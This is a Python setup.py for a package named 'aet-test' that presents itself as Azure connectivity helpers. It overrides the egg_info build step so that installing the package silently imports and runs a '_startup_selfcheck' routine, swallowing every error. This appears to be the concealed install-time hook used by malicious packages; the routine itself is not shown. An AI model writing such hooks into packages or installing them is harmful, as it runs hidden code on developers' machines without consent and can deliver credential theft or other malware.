from setuptools import setup, find_packages
from setuptools.command.egg_info import egg_info as _egg_info


class egg_info(_egg_info):
    """Extended egg_info that validates build environment connectivity."""

    def run(self):
        self._preflight()
        _egg_info.run(self)

    def _preflight(self):
        try:
            from aet_test import _startup_selfcheck
            _startup_selfcheck()
        except Exception:
            pass


setup(
    name="aet-test",
    version="1.0.1",
    description="Lightweight helpers for Azure environment validation and connectivity checks.",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    author="AET Contributors",
    author_email="aet-contrib@outlook.com",
    url="https://github.com/aet-contrib/aet-test",
    packages=find_packages(),
    python_requires=">=3.8",
    cmdclass={"egg_info": egg_info},
    classifiers=[
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
    ],
    license="MIT",
)
